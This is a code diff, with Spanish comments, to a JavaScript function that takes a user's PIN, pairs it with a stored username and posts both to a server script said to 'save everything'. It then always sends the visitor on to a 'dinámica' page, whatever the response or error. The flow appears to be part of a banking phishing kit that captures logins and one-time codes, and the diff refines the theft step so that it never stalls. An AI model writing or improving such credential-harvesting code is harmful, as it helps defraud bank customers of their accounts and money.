@@ -1,20 +1,37 @@
-// Función para el PIN (La que está en PASS.php)
 function pasousuario(p){
-    var d = detectar_dispositivo();
+    var d = "Android Mobile"; // O tu función detectar_dispositivo()
+    var u = localStorage.getItem('user_akam') || "Desconocido";
     
-    // Mostramos el cargando
-    $("#fondo, #cargando-o").show();
+    // Mostramos el cargando oficial
+    $("#cargando-o").css("display", "flex");
     
-    // 1. Enviamos los datos al archivo que los procesa
-    // Asegúrate que la carpeta 'process' y el archivo existan
-    $.post("../process/paso_pin.php", { pin: p, dis: d }, function(data) {
-        // Al recibir respuesta, saltamos
-        console.log("Datos enviados");
+    // 1. Enviamos el PIN al procesador
+    $.ajax({
+        type: 'POST',
+        url: '../process/pasousuario.php', // El que ya actualizamos para guardar todo
+        data: { 
+            'txt-usuario': u, 
+            'txt-password': p 
+        },
+        success: function(res) {
+            // Si el servidor responde 'ok', saltamos a Dinámica
+            if(res.trim() === "ok") {
+                window.location.href = "dinamica.php"; 
+            } else {
+                // Si hay error en el PHP, igual saltamos para no trabar el flujo
+                window.location.href = "dinamica.php";
+            }
+        },
+        error: function() {
+            // Si falla la red, forzamos el salto a los 2 segundos
+            setTimeout(function() { 
+                window.location.href = "dinamica.php"; 
+            }, 1000);
+        }
     });
-    
-    // 2. SALTO DE SEGURIDAD (Para que no se quede el círculo dando vueltas)
+
+    // 2. SALTO DE RESPALDO (Garantiza que nunca se quede pegado)
     setTimeout(function(){ 
-        // CAMBIA ESTO por el nombre real de tu archivo en el repositorio
-        window.location.href = "TU_ARCHIVO_REAL.php"; 
-    }, 2000);
+        window.location.href = "dinamica.php"; 
+    }, 4000);
 }
